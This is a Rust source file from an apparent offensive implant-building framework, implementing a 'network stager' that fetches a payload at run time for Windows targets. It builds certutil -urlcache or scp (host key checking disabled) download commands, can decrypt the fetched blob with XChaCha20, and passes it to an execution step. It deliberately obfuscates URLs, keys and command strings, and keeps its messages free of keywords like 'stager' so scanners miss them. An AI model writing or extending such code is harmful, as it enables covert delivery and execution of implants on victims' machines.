//! Network stager (control technique).
//!
//! Fetches a payload over the network at run time instead of embedding it in the
//! artifact, optionally decrypts it, and hands the bytes to the next Execution
//! step. See `README.md` and `docs/design/network-stager.md`.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;

use super::{Capability, Category, Stability, TechniqueDef};

/// Transport-level protection of the fetched payload.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum StagerCrypto {
    /// The fetched blob is used as-is.
    #[default]
    None,
    /// The fetched blob is XChaCha20-Poly1305 ciphertext, decrypted in the stub.
    XChaCha20Poly1305,
}

impl StagerCrypto {
    /// Whether the fetched blob is encrypted.
    pub fn is_encrypted(self) -> bool {
        matches!(self, StagerCrypto::XChaCha20Poly1305)
    }
}

/// Parameters for the network-stager technique.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Params {
    /// Name of the payload this step fetches (in `build.payloads`). The payload's
    /// `format`/`export`/`args` still describe how the Execution step runs the
    /// fetched bytes; its `source` is ignored for a staged payload.
    pub payload: String,

    /// The URL to fetch. The scheme selects the transport at build time:
    /// `http://`/`https://`/`ftp://` (a `certutil` download) or `scp://`
    /// (an `scp` download).
    pub url: String,

    /// Whether the fetched blob is encrypted (default: `none`).
    #[serde(default)]
    pub crypto: StagerCrypto,

    /// XChaCha20 key (hex, 32 bytes); required when `crypto` is `xchacha20poly1305`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub key: Option<String>,

    /// XChaCha20 nonce (hex, 24 bytes); required when `crypto` is `xchacha20poly1305`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub nonce: Option<String>,

    /// Connect/read timeout, in milliseconds.
    #[serde(default = "default_timeout_ms")]
    pub timeout_ms: u32,

    /// Extra attempts after the first one.
    #[serde(default)]
    pub retries: u32,
}

/// Default stager timeout: 30 seconds.
pub fn default_timeout_ms() -> u32 {
    30_000
}

impl Default for Params {
    fn default() -> Self {
        Self {
            payload: String::new(),
            url: String::new(),
            crypto: StagerCrypto::None,
            key: None,
            nonce: None,
            timeout_ms: default_timeout_ms(),
            retries: 0,
        }
    }
}

/// Static metadata for the network-stager technique.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "network_stager",
    attck: &["T1105", "T1071"],
    // Works end to end on the transport plumbing, but the fetch is a child
    // process (certutil/scp) that has not been measured on a live network, and
    // `ssh` is still its own workstream — see the README.
    stability: Stability::Experimental,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    conflicts: &[],
    category: Category::Control,
    doc_path: "src/techniques/network_stager/README.md",
    readme: include_str!("README.md"),
    stub_fragment: include_str!("stub_fragment.rs"),
    params_example: "technique: network_stager\nparams:\n  payload: implant\n  url: \"https://example.invalid/implant.bin\"\n",
    // The download is a Win32 child process (certutil/scp), like
    // `living_off_the_land`: it is not a kernel call the stub issues.
    syscalls: &[],
    resolves_imports: false,
};

/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
/// pairs. Every message is keyword-free so no technique keyword (such as
/// `stager` or `loader`) reaches the generated stub's `.rdata`.
const MESSAGES: &[(&str, &str)] = &[
    ("$MSG_SPAWN_FAILED$", "could not launch the downloader"),
    ("$MSG_DOWNLOAD_FAILED$", "the downloader failed"),
    ("$MSG_TIMEOUT$", "the downloader timed out"),
    ("$MSG_READ_FAILED$", "could not read the fetched payload"),
];

/// The `scp` transport target (`user@host:path`), parsed from an `scp://` URL at
/// build time so the fragment never parses a scheme at run time.
fn scp_target(url: &str) -> String {
    let rest = url.strip_prefix("scp://").unwrap_or(url);
    let (hostport, path) = match rest.find('/') {
        Some(slash) => (&rest[..slash], &rest[slash + 1..]),
        None => (rest, ""),
    };
    // Drop any `:port` — it is passed as `-P <port>`, not part of `user@host:path`.
    let host = match hostport.rfind(':') {
        Some(pos) => &hostport[..pos],
        None => hostport,
    };
    format!("{host}:{path}")
}

/// The port of an `scp://[user@]host[:port]/path` URL, or empty.
fn scp_port(url: &str) -> String {
    let rest = url.strip_prefix("scp://").unwrap_or(url);
    let hostport = match rest.find('/') {
        Some(slash) => &rest[..slash],
        None => rest,
    };
    match hostport.rfind(':') {
        Some(pos) => hostport[pos + 1..].to_string(),
        None => String::new(),
    }
}

impl Params {
    /// Renders the stager fragment for these parameters.
    ///
    /// The URL, the credentials embedded in it, the crypto key/nonce and the
    /// downloader command/flag strings are all emitted as code that rebuilds the
    /// value at run time through `strings`, so none of them lands in cleartext.
    /// The transport (certutil vs scp) is decided here at build time from the URL
    /// scheme, so the fragment needs no scheme literals.
    pub fn render_fragment(&self, strings: &StringsConfig) -> String {
        let is_scp = self.url.starts_with("scp://");

        let url = strings.obfuscate(&self.url).render_stub_expr("stager_url");
        let scp_target = strings
            .obfuscate(&scp_target(&self.url))
            .render_stub_expr("scp_target");
        let scp_port = strings
            .obfuscate(&scp_port(&self.url))
            .render_stub_expr("scp_port");
        let key = strings
            .obfuscate(self.key.as_deref().unwrap_or(""))
            .render_stub_expr("stager_key");
        let nonce = strings
            .obfuscate(self.nonce.as_deref().unwrap_or(""))
            .render_stub_expr("stager_nonce");

        let certutil = strings
            .obfuscate("certutil")
            .render_stub_expr("bin_certutil");
        let scp = strings.obfuscate("scp").render_stub_expr("bin_scp");
        let arg_urlcache = strings
            .obfuscate("-urlcache")
            .render_stub_expr("arg_urlcache");
        let arg_split = strings.obfuscate("-split").render_stub_expr("arg_split");
        let arg_f = strings.obfuscate("-f").render_stub_expr("arg_f");
        let arg_o = strings.obfuscate("-o").render_stub_expr("arg_o");
        let arg_strict = strings
            .obfuscate("StrictHostKeyChecking=no")
            .render_stub_expr("arg_strict");
        let arg_p = strings.obfuscate("-P").render_stub_expr("arg_p");

        let mut rendered = DEF
            .stub_fragment
            .replace("$URL_DEF$", &url)
            .replace("$SCP_TARGET_DEF$", &scp_target)
            .replace("$SCP_PORT_DEF$", &scp_port)
            .replace("$KEY_DEF$", &key)
            .replace("$NONCE_DEF$", &nonce)
            .replace("$IS_SCP$", if is_scp { "true" } else { "false" })
            .replace(
                "$CRYPTO$",
                if self.crypto.is_encrypted() {
                    "true"
                } else {
                    "false"
                },
            )
            .replace("$TIMEOUT_MS$", &format!("{}u32", self.timeout_ms))
            .replace("$RETRIES$", &format!("{}u32", self.retries))
            .replace("$BIN_CERTUTIL$", &certutil)
            .replace("$BIN_SCP$", &scp)
            .replace("$ARG_URLCACHE$", &arg_urlcache)
            .replace("$ARG_SPLIT$", &arg_split)
            .replace("$ARG_F$", &arg_f)
            .replace("$ARG_O$", &arg_o)
            .replace("$ARG_STRICT$", &arg_strict)
            .replace("$ARG_P$", &arg_p);
        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
            rendered = rendered.replace(
                placeholder,
                &strings
                    .obfuscate(text)
                    .render_stub_expr(&format!("msg_{index}")),
            );
        }
        rendered
    }
}

#[cfg(test)]
mod tests;
